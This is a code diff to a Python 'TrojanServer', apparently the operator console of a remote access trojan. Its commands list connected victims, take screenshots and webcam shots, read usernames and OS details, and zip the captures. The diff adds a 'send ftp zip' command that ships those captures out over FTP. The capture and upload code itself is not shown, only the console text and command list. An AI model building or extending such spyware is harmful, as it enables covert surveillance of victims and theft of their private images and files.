@@ -10,6 +10,8 @@ class TrojanServer(object):
         self.s.bind((self.host, self.port))
         print("Server running...")
         print("type 'help' for commands")
+        print("first send the command 'set global ip' before doing something specific to another client!")
+        print("this updates the public ip of the client that is needed to create and send the files!")
         print()
 
     def listener(self):
@@ -24,7 +26,7 @@ class TrojanServer(object):
     def client_conn(self,client, address):
         # all commands in the list !
         list_of_commands=["show clients","show os","show global ip","show username","make screenshot"
-        ,"make cam shot","exit client","help","show os version","make zip","remove zip"]
+        ,"make cam shot","exit client","help","show os version","make zip","remove zip","send ftp zip","set global ip"]
 
         while True:
             ipstr= address[0] + ":" + str(address[1]) + " >> "
@@ -54,9 +56,10 @@ class TrojanServer(object):
                 print()
                 print("COMMANDS:")
                 print("=========")
+                print("set global ip        - saves the current IP address, this is a requirement for the other commands")
                 print("show clients         - List all connected clients")
                 print("show os              - show you the OS")
-                print("show global ip       - show the global IP")
+                print("show global ip       - show the global IP,and updates the client's public ip")
                 print("show username        - show username from the user")
                 print("show os version      - show os version")
                 print("useconn [IP:PORT]    - Switch to the connection")
@@ -64,6 +67,7 @@ class TrojanServer(object):
                 print("make cam shot        - make a shot from the webcam")
                 print("make zip             - compresses all files created (screenshot, cam shot etc.)")
                 print("remove zip           - deletes the zip file that was created by 'make zip'")
+                print("send ftp zip         - sends the 'make zip' file via ftp")
                 print("exit client          - closes the connection from the client")
                 print("help or ?            - Show all commands and options")
                 print()
